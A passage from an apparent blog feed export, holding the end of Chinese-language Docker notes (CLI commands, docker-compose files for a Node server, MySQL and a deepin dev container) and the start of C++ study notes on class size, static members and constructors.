<h2 id="1-docker-top-查看docker和宿主机的进程对照关系"><a href="#1-docker-top-查看docker和宿主机的进程对照关系" class="headerlink" title="1. docker top 查看docker和宿主机的进程对照关系"></a>1. docker top 查看docker和宿主机的进程对照关系</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PID是宿主机进程<span class="built_in">id</span>，PPID是docker里面的<span class="built_in">id</span></span></span><br><span class="line">=&gt; docker top [container_name|container_id]</span><br><span class="line">UID          PID        PPID      C     STIME     TTY    TIME        CMD</span><br><span class="line">nobody       26505      26486     0     2月16     ?      00:02:53    /usr/bin/python3.6 /usr/bin/supervisord -nc /etc/supervisord.conf</span><br><span class="line">nobody       26560      26505     0     2月16     ?      00:00:00    npm</span><br></pre></td></tr></table></figure>

<h2 id="2-docker-network-查看docker网络情况"><a href="#2-docker-network-查看docker网络情况" class="headerlink" title="2. docker network 查看docker网络情况"></a>2. docker network 查看docker网络情况</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; docker network list</span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">f5efcaf6e2e2   bridge    bridge    local</span><br><span class="line">237ebc86fb1b   host      host      local</span><br><span class="line">d082a187db55   none      null      local</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除一个网络，最好先停止容器，再删除网络</span></span><br><span class="line">=&gt; docker network rm [network_id]</span><br></pre></td></tr></table></figure>

<h2 id="3-docker-search-搜索镜像"><a href="#3-docker-search-搜索镜像" class="headerlink" title="3. docker search 搜索镜像"></a>3. docker search 搜索镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; docker search kali</span><br><span class="line">NAME                           DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">kalilinux/kali-rolling         Official Kali Linux Docker image (weekly sna…   786</span><br><span class="line">kasmweb/kali-rolling-desktop   Kali Rolling desktop for Kasm Workspaces        11</span><br><span class="line">kalilinux/kali-bleeding-edge   Same as kali-rolling with kali-bleeding-edge…   52</span><br><span class="line">kalilinux/kali-last-release    Image built from the last snapshot of the of…   55</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="4-docker-run-启动镜像"><a href="#4-docker-run-启动镜像" class="headerlink" title="4. docker run 启动镜像"></a>4. docker run 启动镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure>

<h3 id="4-1-选项"><a href="#4-1-选项" class="headerlink" title="4.1. 选项"></a>4.1. 选项</h3><ul>
<li><code>-d</code>: 后台运行</li>
<li><code>-p [host-port:docker-port]</code>: 端口映射</li>
<li><code>--rm</code>: 停止后删除容器</li>
<li><code>--name [name]</code>: 给容器起名字</li>
<li><code>--network [network-mode]</code>: 网络模式，也可以指定自己建立的网络</li>
<li><code>-i</code>: 启动后无需命令也不停止，就是compose的tty为true</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动一个image</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-d 后台运行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p host:docker 端口映射</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--<span class="built_in">rm</span> 容器停止后删除容器</span></span><br><span class="line">docker run -d -p 8085:8080 [image_name]:[tag]</span><br></pre></td></tr></table></figure>

<h1 id="五、dockerfile解释和编写"><a href="#五、dockerfile解释和编写" class="headerlink" title="五、dockerfile解释和编写"></a>五、dockerfile解释和编写</h1><h2 id="1-docker-compose-yml"><a href="#1-docker-compose-yml" class="headerlink" title="1. docker-compose.yml"></a>1. docker-compose.yml</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span>            <span class="comment"># 版本号，我也不知道怎么写，随意写个3</span></span><br><span class="line"><span class="attr">services:</span>               <span class="comment"># 服务，里面写docker容器的服务</span></span><br><span class="line">    <span class="attr">sms_server:</span>                             <span class="comment"># 服务名</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">sms_server</span>          <span class="comment"># 指定容器名字，不让容器自己起名字</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">&#x27;node:latest&#x27;</span>                <span class="comment"># 依赖的镜像，这里是不写Dockerfile的关键</span></span><br><span class="line">        <span class="attr">ports:</span>                              <span class="comment"># 端口映射关系，host:container</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7878:7878&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span>                            <span class="comment"># 挂载路径，本地是当前目录（yml所在目录），挂载到container的/code目录，并且只读</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">.:/code:ro</span></span><br><span class="line">        <span class="attr">network_mode:</span> <span class="string">&quot;bridge&quot;</span>              <span class="comment"># 网络模式，bridge是docker默认的网络模式，可以省略，可选bridge、host、none</span></span><br><span class="line">        <span class="attr">environment:</span>                        <span class="comment"># 环境变量</span></span><br><span class="line">            <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line">            <span class="attr">GO111MODULE:</span> <span class="string">&#x27;on&#x27;</span></span><br><span class="line">            <span class="attr">GOPROXY:</span> <span class="string">&#x27;https://goproxy.cn&#x27;</span></span><br><span class="line">        <span class="attr">working_dir:</span> <span class="string">/code</span>                  <span class="comment"># 工作目录，docker启动后自动cd到此目录</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;server.js&quot;</span>]      <span class="comment"># 容器服务启动的命令</span></span><br><span class="line">        <span class="comment"># tty: true                           # 不设置command可以用这一行不让容器退出</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">always</span>                     <span class="comment"># docker服务自启动，并且自动重启</span></span><br><span class="line">        <span class="attr">privileged:</span> <span class="literal">false</span>                   <span class="comment"># 为true代表docker里面的root就是外面的root，否则只是普通用户</span></span><br><span class="line">        <span class="attr">cap_add:</span>                            <span class="comment"># 添加权限</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">ALL</span></span><br><span class="line">        <span class="attr">cap_drop:</span>                           <span class="comment"># 删除权限</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br></pre></td></tr></table></figure>

<h3 id="1-1-service和container"><a href="#1-1-service和container" class="headerlink" title="1.1. service和container"></a>1.1. service和container</h3><ul>
<li>service是docker-compose的概念，container是docker的概念</li>
<li>一个service可以存在多个container，对应到<code>docker ps</code>就是多个container，<code>docker ps</code>无法查看service的名字</li>
<li>同一个service下面可以起多个相同的容器<code>docker-compose up --scale sms_server=5</code><ul>
<li>不能指定<code>container_name</code>，指定就无法起，默认使用<code>&lt;当前路径名&gt;_&lt;service name&gt;_&lt;序号&gt;</code>起名</li>
<li>如果指定了端口映射，这里也会报错，因为端口被占用</li>
</ul>
</li>
</ul>
<h1 id="六、实战"><a href="#六、实战" class="headerlink" title="六、实战"></a>六、实战</h1><h2 id="1-启用一个sms-server服务"><a href="#1-启用一个sms-server服务" class="headerlink" title="1. 启用一个sms_server服务"></a>1. 启用一个<code>sms_server</code>服务</h2><p>根据一个实例可以快速上手</p>
<h3 id="1-1-需求"><a href="#1-1-需求" class="headerlink" title="1.1. 需求"></a>1.1. 需求</h3><ul>
<li>将一个nodejs实现的服务器部署到docker上</li>
<li>代码在服务器硬盘，可以实现修改了代码，重启一个服务就可以生效</li>
</ul>
<h3 id="1-2-服务器代码"><a href="#1-2-服务器代码" class="headerlink" title="1.2. 服务器代码"></a>1.2. 服务器代码</h3><p>很简单的一个监听7878端口http请求，统一返回一个json的设置cookie的代码，运行也只需要<code>node server.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> json = &#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;llll&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;aaaa&quot;</span>: <span class="string">&quot;stest&quot;</span>,</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: <span class="string">&quot;a454as1bbvd5g5s15155&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, [<span class="string">&quot;c=1;httponly&quot;</span>, <span class="string">&quot;b=2&quot;</span>, <span class="string">&quot;a=3&quot;</span>]);</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>: <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(json)).<span class="property">length</span> &#125;)</span><br><span class="line">    res.<span class="title function_">write</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(json))</span><br><span class="line">    index++</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`&lt;h3&gt;<span class="subst">$&#123;index&#125;</span>&lt;/h3&gt;`</span>)</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="keyword">function</span> (<span class="params">chunk</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">7878</span>, <span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the server is starting&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-3-编写dockerfile"><a href="#1-3-编写dockerfile" class="headerlink" title="1.3. 编写dockerfile"></a>1.3. 编写dockerfile</h3><ul>
<li>Dockerfile写起来比较麻烦，这里就简单化，使用node镜像作为基础，Dockerfile可以省略</li>
<li>但是需要编写docker-compose.yml文件，并且安装docker-compose</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span>            <span class="comment"># 版本号，我也不知道怎么写，随意写个3</span></span><br><span class="line"><span class="attr">services:</span>               <span class="comment"># 服务，里面写docker容器的服务</span></span><br><span class="line">    <span class="attr">sms_server:</span>                             <span class="comment"># 服务名</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">sms_server</span>          <span class="comment"># 指定容器名字，不让容器自己起名字</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">&#x27;node:latest&#x27;</span>                <span class="comment"># 依赖的镜像，这里是不写Dockerfile的关键</span></span><br><span class="line">        <span class="attr">ports:</span>                              <span class="comment"># 端口映射关系，host:container</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7878:7878&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span>                            <span class="comment"># 挂载路径，本地是当前目录（yml所在目录），挂载到container的/code目录，并且只读</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">.:/code:ro</span></span><br><span class="line">        <span class="attr">network_mode:</span> <span class="string">&quot;bridge&quot;</span>              <span class="comment"># 网络模式，bridge是docker默认的网络模式，可以省略，可选bridge、host、none</span></span><br><span class="line">        <span class="comment"># environment:                      # 环境变量</span></span><br><span class="line">        <span class="comment">#     MYSQL_ROOT_PASSWORD: &quot;123456&quot;</span></span><br><span class="line">        <span class="attr">working_dir:</span> <span class="string">/code</span>                  <span class="comment"># 工作目录，docker启动后自动cd到此目录</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;server.js&quot;</span>]      <span class="comment"># 容器服务启动的命令</span></span><br><span class="line">        <span class="comment"># tty: true                           # 不设置command可以用这一行不让容器退出</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">always</span>                     <span class="comment"># docker服务自启动，并且自动重启</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-运行"><a href="#1-4-运行" class="headerlink" title="1.4. 运行"></a>1.4. 运行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定yml文件，-d后台运行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--force-recreate 强制重建</span></span><br><span class="line">sudo docker-compose -f server.yml up -d</span><br></pre></td></tr></table></figure>

<h2 id="2-使用mysql"><a href="#2-使用mysql" class="headerlink" title="2. 使用mysql"></a>2. 使用mysql</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:latest</span><br></pre></td></tr></table></figure>

<h3 id="2-2-运行"><a href="#2-2-运行" class="headerlink" title="2.2. 运行"></a>2.2. 运行</h3><ul>
<li>编写<code>docker-compose.yml</code></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># server.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span>            <span class="comment"># 版本号，我也不知道怎么写，随意写个3</span></span><br><span class="line"><span class="attr">services:</span>               <span class="comment"># 服务，里面写docker容器的服务</span></span><br><span class="line">    <span class="attr">mysql:</span>                             <span class="comment"># 服务名</span></span><br><span class="line">        <span class="attr">container_name:</span> <span class="string">mysql</span>          <span class="comment"># 指定容器名字，不让容器自己起名字</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">&#x27;mysql:latest&#x27;</span>          <span class="comment"># 依赖的镜像，这里是不写Dockerfile的关键</span></span><br><span class="line">        <span class="attr">volumes:</span>                       <span class="comment"># 挂载路径，本地是当前目录（yml所在目录）</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">./data/var_lib_mysql:/var/lib/mysql:rw</span>        <span class="comment"># 将mysql的数据目录和本地做映射，这样如果mysql容器重启，数据保留</span></span><br><span class="line">        <span class="attr">ports:</span>                         <span class="comment"># 端口映射关系，host:container</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">&quot;123456&quot;</span>   <span class="comment"># root密码</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span>                           <span class="comment"># 不设置command可以用这一行不让容器退出</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">always</span>                     <span class="comment"># docker服务自启动，并且自动重启</span></span><br></pre></td></tr></table></figure>

<h2 id="3-构建deepin开发环境"><a href="#3-构建deepin开发环境" class="headerlink" title="3. 构建deepin开发环境"></a>3. 构建deepin开发环境</h2><p>基于镜像<code>168447636/deepin20</code></p>
<h3 id="3-1-初始化设置"><a href="#3-1-初始化设置" class="headerlink" title="3.1. 初始化设置"></a>3.1. 初始化设置</h3><ul>
<li>进入docker后初始化</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装必备软件</span></span><br><span class="line">apt install zsh tmux git gdb iptables net-tools dnsutils apt-file locales wget curl iputils-ping</span><br><span class="line">apt autoremove</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新apt-file</span></span><br><span class="line">apt-file update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置时区</span></span><br><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

<ul>
<li>提交改动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit deepin_worker deepin_worker</span><br></pre></td></tr></table></figure>

<h3 id="3-2-docker-compose-yml编写"><a href="#3-2-docker-compose-yml编写" class="headerlink" title="3.2. docker-compose.yml编写"></a>3.2. docker-compose.yml编写</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">deepin_worker:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">deepin_worker</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&#x27;deepin_worker:latest&#x27;</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">&#x27;bridge&#x27;</span></span><br><span class="line">    <span class="attr">volumes:</span> <span class="comment"># 挂载路径，本地是当前目录（yml所在目录），挂载到container的/code目录，并且只读</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.:/code:rw</span></span><br><span class="line">    <span class="attr">environment:</span>                        <span class="comment"># 环境变量</span></span><br><span class="line">        <span class="attr">GO111MODULE:</span> <span class="string">&#x27;on&#x27;</span></span><br><span class="line">        <span class="attr">GOPROXY:</span> <span class="string">&#x27;http://goproxy.cn&#x27;</span></span><br><span class="line">        <span class="attr">GOSUMDB:</span> <span class="string">&#x27;off&#x27;</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/code</span>  <span class="comment"># 工作目录，docker启动后自动cd到此目录</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>    <span class="comment"># 可以使用iptables命令</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure>

<h1 id="七、源码阅读"><a href="#七、源码阅读" class="headerlink" title="七、源码阅读"></a>七、源码阅读</h1><h2 id="1-docker各个组件之间的关系"><a href="#1-docker各个组件之间的关系" class="headerlink" title="1. docker各个组件之间的关系"></a>1. docker各个组件之间的关系</h2><img src="2022-04-14-01.jpg" />

<ul>
<li>docker的cli也就是命令行部分: <a href="https://github.com/docker/cli.git">https://github.com/docker/cli.git</a></li>
<li>docker的engine部分: <a href="https://github.com/moby/moby.git">https://github.com/moby/moby.git</a></li>
<li>containerd: <a href="https://github.com/containerd/containerd.git">https://github.com/containerd/containerd.git</a></li>
<li>runc: <a href="https://github.com/opencontainers/runc.git">https://github.com/opencontainers/runc.git</a></li>
</ul>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-docker容器内部无法使用iptables命令"><a href="#1-docker容器内部无法使用iptables命令" class="headerlink" title="1. docker容器内部无法使用iptables命令"></a>1. docker容器内部无法使用iptables命令</h2><ul>
<li>容器本身是跟操作系统绑定，并非完整的系统，所以iptables其实操作的是宿主机的</li>
<li>如果是编译环境做测试用的，可以直接加上<code>--privileged</code>或<code>--add-cap NET_ADMIN</code></li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>C++学习笔记</title>
    <url>/blogs/2018-07-06-CppStudy/</url>
    <content><![CDATA[<h1 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h1><h2 id="1-对象"><a href="#1-对象" class="headerlink" title="1. 对象"></a>1. 对象</h2><h3 id="1-1-类的大小"><a href="#1-1-类的大小" class="headerlink" title="1.1. 类的大小"></a>1.1. 类的大小</h3><h4 id="空类"><a href="#空类" class="headerlink" title="空类"></a>空类</h4><p>C++标准指出，不允许一个对象（当然包括类对象）的大小为 0，不同的对象不能具有相同的地址。这是由于：</p>
<ul>
<li>new 需要分配不同的内存地址，不能分配内存大小为 0 的空间</li>
<li>避免除以 sizeof(T)时得到除以 0 错误</li>
</ul>
<p>故使用 1 个字节来区分空类。结构体与此相同，空结构体大小为 1 个字节</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;<span class="type">int</span> a&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sizeof empty class %d&quot;</span>, <span class="built_in">sizeof</span>(A));     <span class="comment">//输出1，空类大小为1个字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sizeof not empty class %d&quot;</span>, <span class="built_in">sizeof</span>(B)); <span class="comment">//输出4，int为4个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字节对齐"><a href="#字节对齐" class="headerlink" title="字节对齐"></a>字节对齐</h4><p>类中变量大小需要字节对齐，计算大小时需注意</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sizeof class A %d&quot;</span>, <span class="built_in">sizeof</span>(A));     <span class="comment">//输出8，字节对齐4+4=8字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><p>静态成员属于类作用域，但不属于类对象，它的生命周期和普通的静态变量一样，程序运行时进行分配内存和初始化，程序结束时则被释放。所以不能在类的构造函数中进行初始化。</p>
<h5 id="static-成员的优点"><a href="#static-成员的优点" class="headerlink" title="static 成员的优点"></a>static 成员的优点</h5><ul>
<li>static 成员的名字是在类的作用域中，因此可以避免与其它类成员或全局对象名字冲突。</li>
<li>可以实施封装，static 成员可以是私有的，而全局对象不可以。</li>
<li>阅读程序容易看出 static 成员与某个类相关联，这种可见性可以清晰地反映程序员的意图。</li>
</ul>
<h5 id="static-成员函数特点"><a href="#static-成员函数特点" class="headerlink" title="static 成员函数特点"></a>static 成员函数特点</h5><ul>
<li>因为 static 成员函数没有 this 指针，所以静态成员函数不可以访问非静态成员。</li>
<li>非静态成员函数可以访问静态成员。</li>
<li>静态数据成员与类的大小无关，因为静态成员只是作用在类的范围而已。</li>
</ul>
<h5 id="大小"><a href="#大小" class="headerlink" title="大小"></a>大小</h5><p>静态变量不占用类的大小中，所以 sizeof 输出的大小不包含静态变量的大小</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//输出8，字节对齐4+4=8字节，静态变量不参与运算</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sizeof class A %d&quot;</span>, <span class="built_in">sizeof</span>(A));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h4><p>成员函数不算在类的大小中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">fun2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//输出8，字节对齐4+4=8字节，成员函数不参与大小计算</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sizeof class A %d&quot;</span>, <span class="built_in">sizeof</span>(A));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-实例化"><a href="#1-2-实例化" class="headerlink" title="1.2. 实例化"></a>1.2. 实例化</h3><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><ul>
<li>如果不写构造函数，系统会默认初始化一个默认构造函数</li>
<li>当写了带参数的构造函数（拷贝、移动构造函数均属于带参数的构造函数），系统将不会创建默认构造函数，默认构造函数不可用，除非自己定义</li>
<li>如果存在无法进行拷贝的成员（如std::mutex），需要显式定义拷贝构造函数，并且不能使用default。不写和使用default在调用拷贝时会编译失败</li>
<li>对于包含动态分配成员或包含指针成员的类都应该提供拷贝构造函数；在提供拷贝构造函数的同时，还应该考虑重载”&#x3D;”赋值操作符号。</li>
<li>拷贝构造函数的调用一般为变量初始化时使用另一个变量的复制体构造，拷贝赋值函数为变量已经初始化了，使用另一个变量进行拷贝赋值</li>
<li>移动构造函数的调用一般为变量初始化时使用右值构造，移动赋值函数为变量已经初始化了，使用右值进行移动赋值</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 无参构造函数</span></span><br><span class="line">    <span class="built_in">A</span>() = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// 有参构造函数</span></span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> n) &#123;&#125;</span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    <span class="built_in">A</span>(<span class="type">const</span> A &amp;a) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// 拷贝赋值函数</span></span><br><span class="line">    A &amp;<span class="keyword">operator</span>=(<span class="type">const</span> A &amp;a) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// 移动构造函数</span></span><br><span class="line">    <span class="built_in">A</span>(A &amp;&amp;a) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// 移动赋值函数</span></span><br><span class="line">    A &amp;<span class="keyword">operator</span>=(A &amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A var1;                     <span class="comment">// 无参构造</span></span><br><span class="line">    <span class="function">A <span class="title">var2</span><span class="params">(<span class="number">1</span>)</span></span>;                  <span class="comment">// 有参构造</span></span><br><span class="line">    A var3 = var1;              <span class="comment">// 拷贝构造</span></span><br><span class="line">    var3 = var2;                <span class="comment">// 拷贝赋值</span></span><br><span class="line">    A var4 = std::<span class="built_in">move</span>(var1);   <span class="comment">// 移动构造</span></span><br><span class="line">    var4 = std::<span class="built_in">move</span>(var2);     <span class="comment">// 移动赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="explicit-关键字"><a href="#explicit-关键字" class="headerlink" title="explicit 关键字"></a>explicit 关键字</h5><ul>
<li>禁止构造函数的隐式调用，即非预期的转换</li>
<li>单参数构造函数会要求声明，多参数可选，无参不需要</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a = <span class="number">10</span>;   <span class="comment">// 隐式调用构造函数</span></span><br><span class="line">    <span class="function">A <span class="title">a</span><span class="params">(<span class="number">10</span>)</span></span>;    <span class="comment">// 显式调用构造函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h4><ul>
<li>析构函数不能写成纯虚函数，因为析构会从子类析构函数向上调用，父类未定义会有问题，编译都放不过</li>
<li>如果存在继承关系，析构函数要写虚析构，这样会在析构的时候找继承表调用子类析构函数</li>
</ul>
